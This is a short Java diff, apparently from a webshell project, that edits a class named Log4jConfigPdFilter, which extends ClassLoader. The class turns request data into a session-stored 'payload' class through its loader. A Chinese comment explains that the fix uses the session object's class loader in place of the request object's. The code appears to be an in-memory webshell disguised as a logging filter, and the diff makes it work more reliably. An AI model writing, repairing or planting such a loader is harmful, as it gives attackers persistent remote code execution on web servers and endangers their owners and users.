@@ -90,7 +90,8 @@ public class Log4jConfigPdFilter extends ClassLoader{
 
             if (payload == null) {
                 java.lang.reflect.Method setAttr = sessionClass.getClass().getMethod("setAttribute", String.class, Object.class);
-                setAttr.invoke(sessionClass, "payload", (new Log4jConfigPdFilter(reqClass.getClass().getClassLoader())).Q(data));
+                // 修复使用使用reqClass.getClass().getClassLoader()出现的问题，这里只能使用sessionClass，而不能使用reqClass
+                setAttr.invoke(sessionClass, "payload", (new Log4jConfigPdFilter(sessionClass.getClass().getClassLoader())).Q(data));
             } else {
                 java.lang.reflect.Method setReqAttr = reqClass.getMethod("setAttribute", String.class, Object.class);
                 setReqAttr.invoke(requestObj, "parameters", data);
